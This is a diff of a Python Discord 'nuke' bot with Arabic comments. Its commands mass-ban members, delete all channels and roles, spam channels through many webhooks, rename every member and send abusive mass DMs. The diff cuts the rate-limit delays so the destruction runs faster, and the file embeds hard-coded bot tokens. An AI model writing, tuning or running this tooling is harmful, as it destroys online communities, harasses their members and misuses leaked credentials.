@@ -2,12 +2,10 @@ import discord
 from discord import app_commands
 import asyncio
 import random
-import warnings
-warnings.filterwarnings("ignore")
 
 intents = discord.Intents.default()
 intents.message_content = True
-intents.members = True
+intents.members = True          # مهم جدًا للرولات + @everyone + بان + mass DM
 intents.guilds = True
 
 client = discord.Client(intents=intents)
@@ -25,7 +23,7 @@ allowed_users = {
     1261097811890540619,
     1257036373970522233,
     1274794363301658656,
-    1387805990933495908,
+    1387805990933495908,   # أنت
     605166970098417677,
     1469237407210803284,
     1370798402006421634,
@@ -34,10 +32,11 @@ allowed_users = {
 }
 
 # ===============================
-# قائمة الـ IDs الممنوعين تمامًا
+# قائمة الـ IDs الممنوعين تمامًا (حتى لو هم اللي أضافوا البوت)
 # ===============================
 banned_users = {
-    1348047167926833152,
+    1348047167926833152,   # اليوزر اللي طلبت تحظره
+    # لو عايز تحظر حد تاني في المستقبل، ضيفه هنا
 }
 
 async def is_allowed(interaction: discord.Interaction) -> bool:
@@ -77,15 +76,6 @@ def split_message(text, limit=2000):
 # متغير لتخزين آخر رسالة في /spam2
 # ===============================
 last_spam2_message = None
-
-# =====================================================
-# ================== PING =============================
-# =====================================================
-@tree.command(name="ping", description="اختبار استجابة البوت")
-@app_commands.allowed_installs(users=True, guilds=True)
-@app_commands.allowed_contexts(dms=True, private_channels=True, guilds=True)
-async def ping(interaction: discord.Interaction):
-    await interaction.response.send_message(f"🏓 Pong! {round(client.latency * 1000)}ms", ephemeral=True)
 
 # =====================================================
 # ================== AVATAR ===========================
@@ -164,7 +154,7 @@ class SpamExButton(discord.ui.View):
         for _ in range(5):
             for part in split_message(long_spam):
                 await interaction.followup.send(part, ephemeral=False)
-                await asyncio.sleep(1.5)
+                await asyncio.sleep(0.8)
 
 @tree.command(name="spam", description="زر spam EX")
 @app_commands.allowed_installs(users=True, guilds=True)
@@ -192,7 +182,7 @@ class Spam2Modal(discord.ui.Modal, title="Spam 2"):
         await interaction.response.defer()
         for _ in range(5):
             await interaction.followup.send(last_spam2_message, ephemeral=False)
-            await asyncio.sleep(1.5)
+            await asyncio.sleep(1.0)
 
 class Spam2Button(discord.ui.View):
     def __init__(self):
@@ -209,7 +199,7 @@ class Spam2Button(discord.ui.View):
             await interaction.response.defer()
             for _ in range(5):
                 await interaction.followup.send(last_spam2_message, ephemeral=False)
-                await asyncio.sleep(1.5)
+                await asyncio.sleep(1.0)
 
 @tree.command(name="spam2", description="(اكتب الرساله وسيتم السبام)")
 @app_commands.allowed_installs(users=True, guilds=True)
@@ -234,7 +224,7 @@ class GifButton(discord.ui.View):
         await interaction.response.defer()
         for _ in range(5):
             await interaction.followup.send(self.gif_link, ephemeral=False)
-            await asyncio.sleep(1.5)
+            await asyncio.sleep(1.0)
 
 @tree.command(name="gif", description="سبام gif")
 @app_commands.allowed_installs(users=True, guilds=True)
@@ -296,7 +286,7 @@ async def userinfo(interaction: discord.Interaction, member: discord.User = None
     await interaction.response.send_message(embed=embed)
 
 # ===============================
-# أمر /banall (معدل السرعة)
+# أمر /banall
 # ===============================
 @tree.command(
     name="banall",
@@ -329,7 +319,7 @@ async def ban_all(interaction: discord.Interaction):
         try:
             await guild.ban(member, reason="Mass ban by admin")
             banned_count += 1
-            await asyncio.sleep(1.5)
+            await asyncio.sleep(0.9)
         except discord.Forbidden:
             failed_count += 1
         except discord.HTTPException as e:
@@ -346,7 +336,7 @@ async def ban_all(interaction: discord.Interaction):
     )
 
 # ===============================
-# الأمر /channels (معدل السرعة)
+# الأمر /channels
 # ===============================
 @tree.command(
     name="channels",
@@ -379,7 +369,7 @@ async def create_channels(interaction: discord.Interaction):
         try:
             await channel.delete(reason="Mass channel delete - keep command channel")
             channels_deleted += 1
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.05)
         except Exception as e:
             channels_failed += 1
             print(f"فشل حذف قناة {channel.name}: {e}")
@@ -392,7 +382,7 @@ async def create_channels(interaction: discord.Interaction):
         try:
             await role.delete(reason="Mass role delete - keep bot roles only")
             roles_deleted += 1
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.03)
         except Exception as e:
             roles_failed += 1
             print(f"فشل حذف رول {role.name}: {e}")
@@ -426,7 +416,7 @@ async def create_channels(interaction: discord.Interaction):
                 messages_sent += 1
             except:
                 pass
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.0025)
         except discord.HTTPException as e:
             failed += 1
             if e.status == 429:
@@ -447,7 +437,7 @@ async def create_channels(interaction: discord.Interaction):
     )
 
 # ===============================
-# الأمر /nuke (معدل السرعة)
+# الأمر /nuke
 # ===============================
 @tree.command(
     name="nuke",
@@ -474,7 +464,7 @@ async def nuke(interaction: discord.Interaction):
             continue
         try:
             await channel.delete(reason="Nuke - Mass delete (keep command channel)")
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.05)
         except:
             pass
     bot_roles = set(guild.get_member(client.user.id).roles)
@@ -483,7 +473,7 @@ async def nuke(interaction: discord.Interaction):
             continue
         try:
             await role.delete(reason="Nuke - Mass role delete")
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.03)
         except:
             pass
     for emoji in guild.emojis:
@@ -499,7 +489,7 @@ async def nuke(interaction: discord.Interaction):
         try:
             await guild.ban(member, reason="Nuke - Mass ban")
             banned_count += 1
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.01)
         except:
             pass
     await interaction.followup.send(
@@ -510,7 +500,7 @@ async def nuke(interaction: discord.Interaction):
     )
 
 # ===============================
-# الأمر /raid (معدل السرعة)
+# الأمر /raid
 # ===============================
 @tree.command(
     name="raid",
@@ -541,7 +531,7 @@ async def raid(interaction: discord.Interaction):
                 messages += 1
             except:
                 pass
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.01)
         except discord.HTTPException as e:
             if e.status == 429:
                 await asyncio.sleep(5)
@@ -556,7 +546,7 @@ async def raid(interaction: discord.Interaction):
     )
 
 # ===============================
-# الأمر /rename-all (معدل السرعة)
+# الأمر /rename-all
 # ===============================
 @tree.command(
     name="rename-all",
@@ -581,7 +571,7 @@ async def rename_all(interaction: discord.Interaction):
         try:
             await member.edit(nick=new_nick)
             changed += 1
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.1)
         except:
             pass
     await interaction.followup.send(
@@ -593,25 +583,25 @@ async def rename_all(interaction: discord.Interaction):
     )
 
 # ===============================
-# الأمر /webspam (معدل السرعة)
+# الأمر /webspam
 # ===============================
 @tree.command(
     name="webspam",
     description="ينشئ webhooks كتير ويسبام منها كلهم مع بعض"
 )
 @app_commands.describe(
-    webhooks_count="عدد الـ webhooks (1–8 تقريبًا)",
-    messages_per_webhook="عدد الرسائل من كل webhook (1–5 تقريبًا)"
+    webhooks_count="عدد الـ webhooks (1–15 تقريبًا)",
+    messages_per_webhook="عدد الرسائل من كل webhook (1–8 تقريبًا)"
 )
-async def webspam(interaction: discord.Interaction, webhooks_count: int = 5, messages_per_webhook: int = 3):
+async def webspam(interaction: discord.Interaction, webhooks_count: int = 8, messages_per_webhook: int = 4):
     if not interaction.guild:
         return await interaction.response.send_message("الأمر ده في السيرفرات بس", ephemeral=True)
 
     if not interaction.guild.me.guild_permissions.manage_webhooks:
         return await interaction.response.send_message("البوت مش عنده صلاحية **Manage Webhooks**", ephemeral=True)
 
-    webhooks_count = max(1, min(webhooks_count, 8))
-    messages_per_webhook = max(1, min(messages_per_webhook, 5))
+    webhooks_count = max(1, min(webhooks_count, 15))
+    messages_per_webhook = max(1, min(messages_per_webhook, 8))
 
     await interaction.response.defer(ephemeral=True)
 
@@ -633,7 +623,6 @@ async def webspam(interaction: discord.Interaction, webhooks_count: int = 5, mes
             webhook = await channel.create_webhook(name=name)
             webhooks.append((webhook, name.upper()))
             created += 1
-            await asyncio.sleep(1.0)
         except Exception as e:
             print(f"فشل إنشاء webhook {i+1}: {e}")
             continue
@@ -647,7 +636,7 @@ async def webspam(interaction: discord.Interaction, webhooks_count: int = 5, mes
                     username=display_name,
                 )
                 sent += 1
-                await asyncio.sleep(1.5)
+                await asyncio.sleep(random.uniform(0.4, 0.9))
             except discord.HTTPException as e:
                 if e.status == 429:
                     await asyncio.sleep(e.retry_after + 1)
@@ -674,7 +663,7 @@ async def webspam(interaction: discord.Interaction, webhooks_count: int = 5, mes
     )
 
 # ===============================
-# الأمر /sendto (معدل السرعة)
+# الأمر /sendto – يرسل في الخاص لكل الأعضاء
 # ===============================
 @tree.command(
     name="sendto",
@@ -705,7 +694,7 @@ You are nothing
         try:
             await member.send(message_content)
             sent_count += 1
-            await asyncio.sleep(3.0)
+            await asyncio.sleep(random.uniform(1.8, 3.5))
         except discord.Forbidden:
             failed_count += 1
         except discord.HTTPException as e:
@@ -728,9 +717,10 @@ You are nothing
     )
 
 # ===============================
-# ======== نظام /spamdamge (معدل السرعة) ============
+# ======== نظام /spamdamge ============
 # ===============================
 
+# النص الطويل للتخريب
 SPAM_DAMGE_TEXT = """🔥 𝐄𝐗𝐄 𝐈𝐒 𝐎𝐍-𝐓𝐎𝐏 🔥
 
 👑 𝐊𝐈𝐍𝐆 𝐎𝐅 𝐓𝐇𝐄 𝐒𝐄𝐑𝐕𝐄𝐑 👑
@@ -839,18 +829,21 @@ class SpamDamgeConfirmView(discord.ui.View):
 
     @discord.ui.button(label="✅ تأكيد", style=discord.ButtonStyle.success)
     async def confirm_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        # تعطيل الأزرار بعد الضغط
         for child in self.children:
             child.disabled = True
         await interaction.response.edit_message(content="✅ تم التأكيد! جاري الإرسال...", view=self)
         
+        # إرسال النص 5 مرات بسرعة
         for i in range(5):
             await interaction.channel.send(SPAM_DAMGE_TEXT)
-            await asyncio.sleep(1.5)
+            await asyncio.sleep(0.3)  # تأخير خفيف جداً
         
         await interaction.followup.send("✅ تم إرسال السبام 5 مرات!", ephemeral=True)
 
     @discord.ui.button(label="❌ إلغاء", style=discord.ButtonStyle.danger)
     async def cancel_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        # تعطيل الأزرار بعد الضغط
         for child in self.children:
             child.disabled = True
         await interaction.response.edit_message(content="❌ تم الإلغاء", view=self)
@@ -871,7 +864,7 @@ async def spamdamge(interaction: discord.Interaction):
     )
 
 # ===============================
-# ========= نظام التسجيل في الترمينال =========
+# ========= نظام التسجيل في الترمينال فقط =========
 # ===============================
 @client.event
 async def on_interaction(interaction: discord.Interaction):
@@ -891,33 +884,20 @@ async def on_interaction(interaction: discord.Interaction):
 # ===============================
 @client.event
 async def on_ready():
-    print(f"✅ Bot is ready! Logged in as {client.user}")
-    print(f"✅ Bot ID: {client.user.id}")
-    print(f"✅ Connected to {len(client.guilds)} guilds")
-    
+    print(f"شغال كـ {client.user}")
     try:
         synced = await tree.sync()
-        print(f"✅ Synced {len(synced)} commands!")
+        print(f"تم رفع {len(synced)} أمر global بنجاح!")
     except Exception as e:
-        print(f"❌ Sync failed: {e}")
+        print(f"خطأ في الـ sync: {e}")
 
 async def main():
     while True:
         try:
-            await client.start('MTUxODM2MDgxNzQ3OTg0MzkyMQ.Ge02cH.l25kMv2QAd1iYUicYeK2LGyY76Cyq5gGGToxNU')
+            await client.start('MTUxODM2MDgxNzQ3OTg0MzkyMQ.GTdEk_.VEcIsnlwO8S_eV0HaTrXWpT4O0Q6U6Ccr_S5Do')
         except Exception as e:
             print(f"البوت وقف أو فصل: {e}")
             print("هيرجع يشتغل فورًا...")
-            await asyncio.sleep(5)
 
 if __name__ == "__main__":
-    import threading
-    import flask
-
-    app = flask.Flask('')
-    @app.route('/')
-    def home():
-        return "Bot is running!"
-
-    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)).start()
     asyncio.run(main())
